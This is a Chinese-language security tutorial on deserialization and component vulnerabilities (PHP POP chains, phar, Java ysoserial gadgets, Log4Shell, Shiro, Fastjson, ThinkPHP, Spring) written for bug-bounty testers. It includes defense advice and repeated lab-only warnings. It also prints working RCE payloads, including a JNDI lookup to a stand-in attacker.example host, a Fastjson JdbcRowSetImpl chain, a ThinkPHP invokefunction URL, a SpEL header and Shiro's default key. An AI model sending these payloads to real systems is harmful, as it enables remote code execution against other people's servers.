# 第 9 篇：反序列化与组件漏洞——数据变成对象的那一刻

命令执行、SSTI 是"代码里本来就有危险函数"；反序列化是"数据被还原成对象时，自动调用了魔术方法"；组件漏洞是"你引用的库本身有洞"。

这三类在 SRC 里都属于**高危**，但利用门槛比 SQL 注入高，因为需要看懂代码、构造链、处理版本差异。

---

## 一、序列化是什么

程序要把对象存到文件、数据库、Cookie 里，需要把它变成字符串，这就是序列化；反过来还原成对象，就是反序列化。

```php
class User {
    public $name = 'Alice';
    public $isAdmin = false;
}

$s = serialize(new User());
echo $s;
// O:4:"User":2:{s:4:"name";s:5:"Alice";s:7:"isAdmin";b:0;}
```

格式拆开看：

```text
O:4:"User":2:{ ... }
│ │  │      │
│ │  │      └─ 属性个数
│ │  └─ 类名
│ └─ 类名长度
└─ Object
```

属性类型：

| 标记 | 类型 | 示例 |
| --- | --- | --- |
| `s` | 字符串 | `s:5:"Alice";` |
| `i` | 整数 | `i:123;` |
| `b` | 布尔 | `b:1;` |
| `a` | 数组 | `a:1:{...}` |
| `O` | 对象 | `O:4:"User":...` |
| `N` | null | `N;` |

**关键：** 反序列化不检查"这个对象是不是你该创建的"，只按字符串还原。攻击者可以控制类名和属性值。

## 二、PHP 魔术方法：自动执行的入口

反序列化时会触发这些方法：

| 方法 | 触发时机 |
| --- | --- |
| `__wakeup()` | `unserialize()` 时 |
| `__destruct()` | 对象销毁时 |
| `__toString()` | 对象被当字符串用时 |
| `__call()` | 调用不存在的方法时 |
| `__get()` | 读不存在的属性时 |
| `__invoke()` | 对象被当函数调用时 |
| `__set()` | 写不存在的属性时 |

### 一个最直接的漏洞

```php
<?php
class Demo {
    public $cmd = 'whoami';
    public function __destruct() {
        echo shell_exec($this->cmd);
    }
}

if (isset($_GET['data'])) {
    unserialize($_GET['data']);
}
```

访问：

```text
?data=O:4:"Demo":1:{s:3:"cmd";s:2:"id";}
```

`unserialize()` 还原对象，脚本结束时对象销毁，`__destruct()` 执行 `shell_exec('id')`。

**注意：** 这里的 `cmd` 是 `public`，直接写。`private`/`protected` 属性名里有空字节，格式不同。

### private / protected 属性

```php
class Demo {
    private $cmd = 'id';
    protected $x = 1;
}
```

序列化结果：

```text
O:4:"Demo":2:{s:9:"\0Demo\0cmd";s:2:"id";s:4:"\0*\0x";i:1;}
```

- `private`：`\0类名\0属性名`，长度 = 1 + 类名长度 + 1 + 属性名长度；
- `protected`：`\0*\0属性名`，长度 = 1 + 1 + 1 + 属性名长度。

`\0` 是空字节，用 URL 编码 `%00` 传。

### 生成 payload 的脚本

不要手算长度，用 PHP 生成：

```php
<?php
class Demo {
    public $cmd = 'id';
}
$d = new Demo();
echo urlencode(serialize($d));
```

输出：

```text
O%3A4%3A%22Demo%22%3A1%3A%7Bs%3A3%3A%22cmd%22%3Bs%3A2%3A%22id%22%3B%7D
```

### 本地实验

把上面的 `Demo` 代码保存成 `unser_lab.php`，用 PHP 内置服务器启动：

```bash
php -S 127.0.0.1:8001
```

访问：

```bash
curl --get 'http://127.0.0.1:8001/unser_lab.php' \
  --data-urlencode 'data=O:4:"Demo":1:{s:3:"cmd";s:2:"id";}'
```

返回 `uid=...` 说明反序列化 RCE 成功。**只在本地跑，确认到 `id` 就停。**

## 三、POP 链：把魔术方法串起来

真实代码不会直接 `system($this->cmd)`，而是"析构时调用某个对象的方法"，这就形成了 POP 链（Property-Oriented Programming）。

```php
class A {
    public $b;
    public function __destruct() {
        $this->b->run();
    }
}

class B {
    public $cmd;
    public function run() {
        system($this->cmd);
    }
}
```

payload：

```text
O:1:"A":1:{s:1:"b";O:1:"B":1:{s:3:"cmd";s:2:"id";}}
```

反序列化后：

1. `A` 对象销毁，`__destruct()` 执行；
2. `$this->b` 是 `B` 对象，调用 `run()`；
3. `B::run()` 执行 `system('id')`。

### 真实链的构造思路

1. 找入口魔术方法：`__destruct`、`__wakeup`、`__toString`；
2. 看它调用了哪个属性/方法；
3. 找能控制这个属性的类；
4. 找能执行命令/写文件的"终点"方法；
5. 把对象嵌套起来，生成序列化字符串。

这就是为什么反序列化利用需要**读源码**。没有源码时，只能靠已知框架/组件的链（ysoserial、phpggc）。

### PHPGGC

```bash
git clone https://github.com/ambionics/phpggc.git
cd phpggc
./phpggc -l
./phpggc Laravel/RCE9 system id
```

`phpggc` 内置了很多框架的链，输出就是序列化 payload。**只在授权靶场/项目里用。**

## 四、Phar 反序列化：不调用 `unserialize` 也能触发

Phar 是 PHP 的归档格式，它的元数据（metadata）在读取时会反序列化。只要代码里有文件操作且路径可控：

```php
file_exists($_GET['file']);
```

攻击者传：

```text
?file=phar://upload/test.phar
```

就会触发 `test.phar` 里 metadata 的反序列化。

### 生成一个 phar

```php
<?php
class Demo {
    public $cmd = 'id';
    public function __wakeup() {
        system($this->cmd);
    }
}

$p = new Phar('test.phar');
$p->startBuffering();
$p->addFromString('test.txt', 'test');
$p->setStub('<?php __HALT_COMPILER(); ?>');
$p->setMetadata(new Demo());
$p->stopBuffering();
```

生成时需要 `phar.readonly=0`：

```bash
php -d phar.readonly=0 make_phar.php
```

然后把 `test.phar` 上传，触发 `phar://` 路径。**PHP 8 之后 phar 反序列化仍可能触发，但受配置和代码路径影响，先本地验证。**

## 五、Java 反序列化：`readObject` 的威力

Java 的序列化流有固定头：

```text
AC ED 00 05
```

Base64 后通常以 `rO0AB` 开头。看到 Cookie、参数、文件里有 `rO0AB`，就要怀疑 Java 反序列化。

### 有漏洞的代码

```java
ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
Object obj = ois.readObject();
```

只要反序列化的类在 classpath 里，攻击者就能控制对象的属性。类里若有 `readObject()`、`readResolve()`、`finalize()` 等魔术方法，就可能触发利用链。

### ysoserial

```bash
java -jar ysoserial.jar CommonsCollections6 'id' > payload.bin
```

发送：

```bash
curl --data-binary @payload.bin \
  -H 'Content-Type: application/x-java-serialized-object' \
  http://127.0.0.1:8080/deserialize
```

常见 gadget：

| gadget | 依赖 | 说明 |
| --- | --- | --- |
| `CommonsCollections1-7` | Apache Commons Collections | 最经典 |
| `CommonsBeanutils1` | Commons BeanUtils | 常见于 Shiro |
| `Spring1/2` | Spring | 依赖版本 |
| `Groovy1` | Groovy | 需要 Groovy |
| `JRMPClient` | JDK | 配合 JRMP 监听 |
| `URLDNS` | JDK | **只发 DNS，用于检测** |

**先学 `URLDNS`：** 它不执行命令，只让目标解析一个域名，用来确认"这里确实反序列化"。确认后再考虑命令执行链。

```bash
java -jar ysoserial.jar URLDNS 'http://your-id.dnslog.cn' > urldns.bin
```

### CommonsCollections 链在做什么

以 CC6 为例，大致是：

```text
HashSet.readObject()
  → TiedMapEntry.hashCode()
    → LazyMap.get()
      → ChainedTransformer.transform()
        → InvokerTransformer.transform()
          → Runtime.exec()
```

每一层都是 JDK/第三方库里"合法"的类，攻击者只是把它们按顺序串起来。**这也是为什么反序列化漏洞难防：不是你的代码有洞，而是 classpath 里的库有可用的链。**

### Java 防御

- 不要反序列化不可信数据，改用 JSON/Protobuf；
- 必须用时，加 `ObjectInputFilter` 白名单：

```java
ObjectInputFilter filter = ObjectInputFilter.Config.createFilter(
    "com.example.dto.*;java.base/*;!*"
);
ois.setObjectInputFilter(filter);
```

- 升级 CommonsCollections、Spring、Shiro 等依赖；
- 用 `serialVersionUID` 不能防，攻击者可以伪造；
- WAF 只能拦已知特征，不能根治。

## 六、JNDI 注入与 Log4Shell

JNDI 是 Java 的命名目录服务。代码里：

```java
ctx.lookup(userInput);
```

攻击者传：

```text
ldap://attacker.example/Exploit
```

客户端会去 LDAP 服务器取对象/类，可能触发远程类加载或反序列化。

### Log4Shell（CVE-2021-44228）

Log4j2 会把日志里的 `${jndi:...}` 当 lookup 执行。影响版本大致是 `2.0-beta9` 到 `2.14.1`，后续版本还有绕过，最终建议升级到 `2.17.1+`。

测试时只发 DNS：

```bash
curl -H 'User-Agent: ${jndi:ldap://your-id.dnslog.cn/a}' http://target/
```

如果 DNSLog 收到请求，说明存在 Log4Shell。**不要发带恶意 LDAP 地址的完整利用链。**

常见注入点：

```text
User-Agent
X-Forwarded-For
X-Api-Version
Referer
username / email / 搜索关键词
```

这些值只要被 Log4j 记录，就可能触发。

### 为什么现在没那么好用了

JDK 8u191、7u201、6u211 之后，默认禁止 LDAP 远程 codebase：

```text
com.sun.jndi.ldap.object.trustURLCodebase=false
```

但攻击者仍可能用 LDAP 返回序列化数据 + 本地 gadget，或者利用 Tomcat BeanFactory 等本地工厂。**所以"DNS 通了"不等于"一定能 RCE"，但已经足够证明漏洞存在。**

### 防御

- 升级 Log4j2 到 `2.17.1+`；
- 设置 `log4j2.formatMsgNoLookups=true`（2.10+）；
- 删除 `JndiLookup.class`；
- 限制服务器出站 LDAP/RMI/DNS；
- 不要把用户输入直接交给 JNDI `lookup`。

## 七、Shiro：一个 Cookie 就能反序列化

Apache Shiro 的 "rememberMe" 功能会把用户信息序列化、AES 加密后放进 Cookie。老版本使用硬编码默认密钥，攻击者可以自己加密恶意序列化数据。

### 识别

```bash
curl -I http://target/ -H 'Cookie: rememberMe=deleteMe'
```

如果响应里有：

```http
Set-Cookie: rememberMe=deleteMe
```

说明目标用了 Shiro。这个是"特征"，不是漏洞本身。

### Shiro-550

- 影响：Shiro < 1.2.5（默认密钥）；
- 原理：`rememberMe` 解密后 `readObject`；
- 常见默认密钥：`kPH+bIxk5D2deZiIxcaaaA==`（很多教程/项目用过，必须换）；
- 利用：ysoserial 生成 gadget → AES 加密 → Base64 → 放进 Cookie。

**伦理提醒：** 只验证"默认密钥能否解密"，不要发送命令执行链。报告写"存在 Shiro 默认密钥，可导致反序列化 RCE"，附解密成功的证据即可。

### Shiro-721

需要有效 `rememberMe`，利用 Padding Oracle 构造恶意密文。门槛更高，先学 550。

### 防御

- 升级 Shiro 到最新；
- 不使用硬编码密钥，随机生成并定期轮换；
- 不要把 `rememberMe` 当会话唯一凭据；
- 关闭不必要的 rememberMe 功能。

## 八、Fastjson：`@type` 自动类型

Fastjson 反序列化时会根据 `@type` 创建指定类。老版本 `autoType` 默认开启，攻击者可以指定 `JdbcRowSetImpl` 等类触发 JNDI。

### 检测版本

```bash
curl -s http://target/ -H 'Content-Type: application/json' \
  -d '{"@type":"java.lang.AutoCloseable"}'
```

看报错里有没有 Fastjson 版本、`autoType is not support` 等字样。

### DNS 探测

老版本可以试：

```json
{"@type":"java.net.Inet4Address","val":"your-id.dnslog.cn"}
```

新版本可能把 `java.net.*` 加入 deny 列表，DNS 不一定通。不要因为没 DNS 就断定没有 Fastjson。

### JNDI 利用链（只了解）

```json
{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://attacker.example/Exploit","autoCommit":true}
```

`JdbcRowSetImpl` 会 `lookup(dataSourceName)`，配合恶意 LDAP 服务触发。**这条链在真实目标上绝对不要发，属于 RCE。**

### 版本绕过

Fastjson 历史上多次绕过：

- 1.2.24：`@type` 直接打；
- 1.2.25：增加黑名单；
- 1.2.41/1.2.42：`L`/`[` 绕过；
- 1.2.43：`LL` 绕过；
- 1.2.45：`mybatis` 等 gadget；
- 1.2.47：缓存绕过；
- 1.2.68/1.2.80：AutoType 绕过。

**结论：** 不要靠"升级到某个中间版本"解决，直接升到 `1.2.83+` 或迁移 Fastjson2，并开启 `safeMode`。

### 防御

```java
ParserConfig.getGlobalInstance().setSafeMode(true);
```

- 升级到安全版本；
- 关闭 `autoType`；
- 不要反序列化不可信 JSON；
- WAF 拦 `@type` 只是临时缓解。

## 九、ThinkPHP / Spring 等组件漏洞

### ThinkPHP 5.x RCE

老版本 ThinkPHP 5.0/5.1 存在路由/方法调用问题，经典 payload：

```text
/index.php?s=index/\think\app/invokefunction&function=call_user_func_array&vars[0]=system&vars[1][]=id
```

不同小版本路径不同，有的用 `\think\Container/invokefunction`。**只在本地 Vulhub 靶场复现。**

识别：

```http
X-Powered-By: ThinkPHP
```

或报错页里的 ThinkPHP 版本。

### Spring4Shell（CVE-2022-22965）

Spring MVC 数据绑定 + JDK 9+ + Tomcat 的组合，攻击者通过 `class.module.classLoader...` 修改 Tomcat 日志配置写 webshell。利用条件较苛刻，但危害高。

### Spring Cloud Function（CVE-2022-22963）

请求头：

```http
spring.cloud.function.routing-expression: T(java.lang.Runtime).getRuntime().exec("id")
```

SpEL 注入。需要目标暴露 Function 路由。

### 其他常见组件

| 组件 | 漏洞类型 | 关键词 |
| --- | --- | --- |
| Log4j2 | JNDI 注入 | `${jndi:` |
| Fastjson | AutoType 反序列化 | `@type` |
| Shiro | Cookie 反序列化 | `rememberMe` |
| ThinkPHP | 路由 RCE | `invokefunction` |
| Struts2 | OGNL 注入 | `%{...}`、`Content-Type` |
| WebLogic | 反序列化/T3 | `t3`、`7001` |
| Jenkins | 插件/CLI RCE | `/cli`、`script` |
| Confluence | OGNL | `\u0027` |

组件漏洞的学习方法：

1. 用 Vulhub 起环境；
2. 用官方/公开 PoC 复现；
3. 看补丁 diff，理解根因；
4. 记指纹和检测方法，不要死记 payload。

## 十、防御：减少攻击面

### 反序列化

- 不接受不可信序列化数据，改用 JSON；
- PHP：`unserialize($data, ['allowed_classes' => ['User']])`；
- Java：`ObjectInputFilter` 白名单；
- 对序列化数据做 HMAC 签名，验签后再反序列化；
- 不暴露 `phar://` 可控路径；
- 升级依赖，移除不用的 gadget 库。

### 组件

- 建立 SBOM，知道用了哪些版本；
- 用 Dependabot、OSV、Nuclei 定期扫；
- 及时升级 Log4j2、Fastjson、Shiro、Spring；
- 关闭 Actuator、T3、CLI 等管理端口；
- 限制服务器出站（LDAP/RMI/DNS），降低 JNDI 成功率；
- WAF 虚拟补丁只能争取时间，不能替代升级。

## 十一、SRC 里怎么测

### 反序列化

1. 看 Cookie、参数、文件里有没有 `rO0AB`、`aced0005`、`O:`、`a:`。
2. 有 Java 序列化特征时，先用 `URLDNS` 生成 payload 测 DNS，不要直接上 CC 链。
3. 有 PHP 对象特征时，先构造一个只读的 `__destruct` 验证，不要写文件。
4. 报告写清入口、序列化格式、验证方式；不要贴完整 RCE payload。

### 组件

1. 看响应头、报错页、favicon、`/actuator`、`/actuator/env` 识别框架。
2. Log4j：只在 User-Agent 等位置发 `${jndi:ldap://dnslog/a}`，看 DNS。
3. Fastjson：先发无害的 `@type` 探测，不要发 JNDI 链。
4. Shiro：看 `rememberMe=deleteMe`，只验证默认密钥，不发 gadget。
5. ThinkPHP/Spring：用公开检测 payload 确认版本/入口，命令执行只到 `id`。
6. **不要**用 ysoserial 对生产打 RCE，不要连 LDAP 恶意服务器。
